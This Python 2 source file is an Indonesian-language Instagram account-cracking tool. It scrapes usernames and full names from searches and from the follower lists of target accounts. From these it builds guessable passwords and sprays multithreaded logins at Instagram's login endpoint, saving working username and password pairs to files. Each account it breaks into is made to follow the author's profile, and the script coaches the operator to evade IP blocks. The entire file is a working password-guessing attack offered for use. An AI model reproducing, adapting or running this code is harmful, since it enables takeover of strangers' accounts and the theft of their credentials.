#!/usr/bin/python2
# coding=utf-8
# Author: fall.xavier
# Tool Instaram
# Versi 0.1

### IMPORT MODULE ###
import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time,calendar
from calendar import monthrange
from datetime import date
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
	import concurrent.futures
except ImportError:
	print("\n Modul Futures blom terinstall!...")
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	import requests
except ImportError:
	print("\n Modul Requests blom terinstall!...")
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")

### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

### GLOBAL NAME ###
IP = requests.get('https://api.ipify.org').text
url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}
data_= []
hasil_ok = []
hasil_cp = []
c=1
status_foll =[]
data_followers = []
pencarian_ = []
hastag = []

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))

### DEF JALAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.04)

### HAPUS COOKIE ###
def hapus():
    try:os.remove('cookies.txt')
    except:pass
    try:os.remove('user.txt')
    except:pass

### CEK LOGIN ###
def cek_login():
	global cookie
	try:
		cok = open("cookie.txt", "r").read()
	except IOError:
		login()
	else:	
		url = "https://i.instagram.com/api/v1/friendships/2220243163/followers/?count=5"
		with requests.Session() as ses_dev:
			try:
				login_coki = ses_dev.get(url, cookies={"cookie": cok}, headers=headerz_api)
				if "users" in json.loads(login_coki.content):
					cookie = {"cookie": cok}
				else:
					print"\n %s[!] akun terkena checkpoint!"%(M)
					hapus_cookie()
					login()	
			except ValueError:
				print"\n %s[!] akun terkena checkpoint!"%(M)
				hapus_cookie()
				login()

### LOGINAN ###
def login():
	global cookie
	os.system("clear")
	logo()
	print "  [ login akun instagram untuk lanjut ]"
	username_dev = raw_input("\n [?] username instagram : ")
	pass_dev = raw_input(" [?] password instagram : ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()

			if "userId" in str(data_dev):
				print"\n %s[✓] berhasil login ke akun"%(H)
				for dev in da:
					with open("cookie.txt", "a") as tulis:
						tulis.write(dev+"="+da[dev]+";")
				cok = open("cookie.txt","r").read()
				cookie = {"cookie": cok}

			elif "checkpoint_url" in str(data_dev):
				print"\n %s[!] akun terkena checkpoint!"%(M)

			elif "Please wait" in str(data_dev):
				print" %s[!] aktifkan mode pesawat 5 detik!"%(M)

			else:
				print m+"\n Gagal Login...."
				exit()
				
	except KeyboardInterrupt:
		exit()

### LOGO ###
def logo():
	os.system("clear")
	print("""%s
 ________             _____              _________
 ____  _/_______________  /______ _      __  ____/
  __  / __  __ \_  ___/  __/  __ `/_______  / __  
 __/ /  _  / / /(__  )/ /_ / /_/ /_/_____/ /_/ /  
 /___/  /_/ /_//____/ \__/ \__,_/        \____/   
 """%(N))

### MENU ###
def menu():
	try:
		cok = open("cookie.txt","r").read()
		cookie = {"cookie": cok}
	except (KeyError, IOError):
		jalan(" [!] akun invalid silahkan login ulang")
		hapus()
		login()
	logo()
	print(" [*] Author    : Fall Xavier Dominic Gremory XV.")
	print(" [*] Github    : https://github.com/Fall-Xavier")
	print(" [*] ---------------------------------------------")
	print(" [*] Bergabung : %s"%(tgl))
	print(" [*] Status    : %sPremium%s"%(H,N))
	print(" [*] ---------------------------------------------")
	print(" [*] IP        : %s"%(IP))
	print("\n [ selamat datang %suser premium%s ]\n"%(K,N))
	print(" [01]. crack dari pencarian")
	print(" [02]. crack dari pengikut")
	print(" [03]. crack dari mengikuti")
	print(" [04]. cek akun hasil crack")
	print(" [%s00%s]. logout (hapus login)"%(M,N))
	pil = raw_input("\n [?] pilih menu : ")
	if pil == "1" or pil == "01":
		usr_ = raw_input(" [?] masukan nama pencarian (cth : yoga): ")
		jm = input(" [?] masukan jumlah : ")
		us = usr_.replace(" ", "")
		pencarian_.append("iqbal_dev")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for dev in range(1, jm+1):
			data_.append(us+str(dev)+"==>"+us)
			data_.append(us+"_"+str(dev)+"==>"+us)
			data_.append(us+str(dev)+"_"+"==>"+us)
		atursandi()
	elif pil == "2" or pil == "02":
		pengikut()
		atursandi()
	elif pil == "3" or pil == "03":
		mengikuti()
		atursandi()
	elif pil == "4" or pil == "04":
		cekhasil()
	elif pil == "0" or pil == "00":
		hapus()
		jalan(" [✓] berhasil menghapus semua login")
		exit(" [!] silahkan ketik ulang python2 run.py")
	else:
		print" [!] isi pilhan dengan benar!"

def pengikut():
	try:
		cok = open("cookie.txt","r").read()
		cookie = {"cookie": cok}
	except (KeyError, IOError):
		exit(" [!] silahkan login ulang")
	idt = raw_input(" [?] masukan id atau username : ")
	try:
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(idt), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		id_ = data_us_dev["id"]
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count=100000".format(id_)
		with requests.Session() as ses_dev:
			res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
			for dev in json.loads(res_dat_foll.content)["users"]:
				username = dev["username"]
				nama = dev["full_name"].encode("utf-8")
				data_.append(username+"==>"+nama.decode("utf-8"))
	except Exception as e:
		exit("%s"%(e))
	print("\n [+] total id -> %s%s%s"%(M,len(data_),N)) 

def mengikuti():
	try:
		cok = open("cookie.txt","r").read()
		cookie = {"cookie": cok}
	except (KeyError, IOError):
		exit(" [!] silahkan login ulang")
	idt = raw_input(" [?] masukan id atau username : ")
	try:
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(idt), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		id_ = data_us_dev["id"]
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count=100000".format(id_)
		with requests.Session() as ses_dev:
			res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
			for dev in json.loads(res_dat_foll.content)["users"]:
				username = dev["username"]
				nama = dev["full_name"].encode("utf-8")
				data_.append(username+"==>"+nama.decode("utf-8"))
	except Exception as e:
		exit("%s"%(e))
	print("\n [+] total id -> %s%s%s"%(M,len(data_),N)) 

### CEK HASIL CRACK ###
def cekhasil():
	print('\n [1]. lihat hasil crack OK ')
	print(' [2]. lihat hasil crack CP ')
	anjg = raw_input('\n [?] pilih : ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		raw_input("\n [*] tekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()

def atursandi():
	ask=raw_input(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]:")
	if ask=="y":
		sandimanual()
	elif ask=="t":
		sandiotomatis()
	else:
		exit(" %s[!] pilih jawaban dengan benar!"%(M))

def sandiotomatis():
	print("\n [ pilih method version - silahkan coba satu² ]\n")
	print(" [1]. method V1 (fast)")
	print(" [2]. method V2 (slow)")
	ask=raw_input("\n [?] method : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		fastcrack()
	elif ask=="2":
		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		slowcrack()

def sandimanual():
	print("\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih")
	pwek=raw_input('\n [?] masukan kata sandi : ')
	print(' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N))
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print("\n [ pilih method version - silahkan coba satu² ]\n")
	print(" [1]. method V1 (fast)")
	print(" [2]. method V2 (slow)")
	ask=raw_input("\n [?] method : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in data_:
				uid, name = user.split("==>")
				fall.submit(crack_dev, uid, pwek.split(","))
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print('\n [+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' [+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in data_:
				uid, name = user.split("==>")
				fall.submit(crack_dev, uid, pwek.split(","))
		exit("\n\n [#] crack selesai...")

def fastcrack():
	with ThreadPoolExecutor(max_workers=30) as insta_dev:
		for dataku in data_:
			try:
				pw = []
				data = dataku.encode("utf-8")
				dat_ = data.split("==>")[0]
				pw_ = data.split("==>")[1]
				pw_nam = pw_.split()

				if len(pencarian_) != 1:
					if len(dat_) >= 6:
						pw.append(dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							pw.append(pw_nam[0]+"123")
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
		
					else:
						# pw.append(dat_+dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							pw.append(pw_nam[0]+"123")
							if len(pw_) >= 6:
								pw.append(pw_)
				else:
					pw.append(pw_nam[0]+"123")
					pw.append(dat_)

				insta_dev.submit(crack_dev, dat_, pw)
			except:
				pass

### PW LIST ###
def slowcrack():
    with ThreadPoolExecutor(max_workers=30) as (insta_dev):
        for dataku in data_:
            try:
                pw = []
                data = dataku.encode('utf-8')
                dat_ = data.split('==>')[0]
                pw_ = data.split('==>')[1]
                pw_nam = pw_.split()
                if len(pencarian_) != 1:
                    if len(dat_) >= 6:
                        pw.append(dat_)
                        if len(pw_nam[0]) <= 2:
                            if len(pw_nam) >= 2:
                                pw.append(pw_nam[0] + pw_nam[1])
                            if len(pw_) >= 6:
                                pw.append(pw_)
                        else:
                            pw.append(pw_nam[0] + '123')
                            pw.append(pw_nam[0] + '12345')
                            pw.append('sayang')
                            pw.append('bismillah')
                            pw.append('indonesia')
                            if len(pw_nam) >= 2:
                                pw.append(pw_nam[0] + pw_nam[1])
                            if len(pw_) >= 6:
                                pw.append(pw_)
                    elif len(pw_nam[0]) <= 2:
                        if len(pw_nam) >= 2:
                            pw.append(pw_nam[0] + pw_nam[1])
                        if len(pw_) >= 6:
                            pw.append(pw_)
                    else:
                        if len(pw_nam) >= 2:
                            pw.append(pw_nam[0] + pw_nam[1])
                        pw.append(pw_nam[0] + '123')
                        pw.append(pw_nam[0] + '12345')
                        pw.append('sayang')
                        pw.append('bismillah')
                        pw.append('indonesia')
                        if len(pw_) >= 6:
                            pw.append(pw_)
                else:
                    pw.append(pw_nam[0] + '123')
                    pw.append(pw_nam[0] + '12345')
                    pw.append('sayang')
                    pw.append('bismillah')
                    pw.append('indonesia')
                    pw.append(dat_)
                insta_dev.submit(crack_dev, dat_, pw)
            except:
                pass


count_ = 1

### CRACK ###
count_= 1
def crack_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	
	for pass_satu in pass_dev_:
		if c != 1:
			pass
		else:
			if len(status_foll) != 1:
				print("\r {}[*] [crack] {}/{} OK-:{} - CP-:{}                           ".format(N,str(count_),len(data_),len(hasil_ok), len(hasil_cp))),
				sys.stdout.flush()
				c_pw -= 1
			else:
				pass
		
		try:
			if username_dev in hasil_ok or username_dev in hasil_cp:
				break
			pass_dev = pass_satu.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as dev:
					url_scrap = "https://www.instagram.com/"
					data = dev.get(url_scrap, headers=headerz).content
					crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
				param = {"username": username_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pass_dev),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			except:
				header = {}
				param = {}
				pass
			
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url, data=param, headers=header)
				data_dev = json.loads(respon.content)
				time.sleep(00.1)
				if "checkpoint_url" in str(data_dev):
					cp = "Checkpoint"
					info_dev(username_dev, pass_dev, cp)
					open("CP/%s.txt"%(tanggal),"a").write(" [Chek] %s|%s\n"%(username_dev, pass_dev))
					hasil_cp.append(username_dev)
					break
				elif "userId" in str(data_dev):
					live = "Live"
					if len(status_foll) != 1:
						info_dev(username_dev, pass_dev, live)
						open("OK/%s.txt"%(tanggal),"a").write(" [Live] %s|%s\n"%(username_dev, pass_dev))
						hasil_ok.append(username_dev)
						follow_dev(ses_dev,username_dev)
					else:
						hasil_ok.append("dev_id")
						follow_dev(ses_dev,username_dev)
					break
				elif "Please wait" in str(data_dev):
					print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
					c+=1
					sys.stdout.flush()
					pass_dev_iq = [pass_dev]
					crack_dev(username_dev, pass_dev_iq)
					count_ -= 1
				else:
					c = 1
					pass
		except requests.exceptions.ConnectionError:
			print("\r %s[!] anda tidak terhubung ke internet                          "%(M)),
			sys.stdout.flush()
			c+=1
			pass_dev_iq = [pass_dev]
			crack_dev(username_dev, pass_dev_iq)
			count_ -= 1
		except:
			c = 1
			pass

	count_+=1

### DEF BUAT FOLLOW ###
c_foll = 1
count_foll = 1
def follow_dev(ses_dev, username_dev):
	global c_foll, count_foll
	if len(status_foll) != 1:
		user_target = "fall.xavier"
		id_target = "2220243163"
	else:
		print("\r {}[*] [follow] {}/{} OK-:{} - CP-:{}".format(N,str(count_foll),len(data_),len(hasil_ok), len(hasil_cp))),
		sys.stdout.flush()
		user_target = username_get_follow
		id_target = id_

	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
	if len(status_foll) != 1:
		pass
	else:
		print(" [✓] berhasil mengikuti")

### DEF INFO NYA ###
def info_dev(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(username_dev), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
		if status == "Live":
			print"\r "+N+"[✓] nama      : "+H+ str(nama) + "                           "
			print"\r "+N+"[✓] username  : "+H+ username_dev + "              "
			print"\r "+N+"[✓] password  : "+H+ pass_dev + "             "
			print"\r "+N+"[✓] pengikut  : "+H+ str(pengikut) + "              "
			print"\r "+N+"[✓] mengikuti : "+H+ str(mengikuti) + "              \n"
		elif status == "Checkpoint":
			print"\r "+N+"[✓] nama      : "+K+ str(nama) + "                           "
			print"\r "+N+"[✓] username  : "+K+ username_dev + "                "
			print"\r "+N+"[✓] password  : "+K+ pass_dev + "             "
			print"\r "+N+"[✓] pengikut  : "+K+ str(pengikut) + "              "
			print"\r "+N+"[✓] mengikuti : "+K+ str(mengikuti) + "              \n"
		else:
			pass
	except:
		pass
None

def auto_follow(status_):
	if status_ == "iqbal_dev":
		try:
			data_cp = open("cp.txt","r").readlines()
			for dev in data_cp:
				data_.append(dev)
		except:
			exit()
		with ThreadPoolExecutor(max_workers=10) as insta_cek_dev:
			for data_cek in data_cp:
				try:
					pw_cp_ = []
					user_cp = data_cek.split("|")[1].replace(" [Check] ","")
					pw_cp_ = data_cek.split("|")[3]
					pw_cp_.append(pw_cp_+y)
					insta_cek_dev.submit(crack_dev, user_cp, pw_cp_)
				except:
					pass

None

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__=="__main__":
	buatfolder()
	cek_login()
	menu()



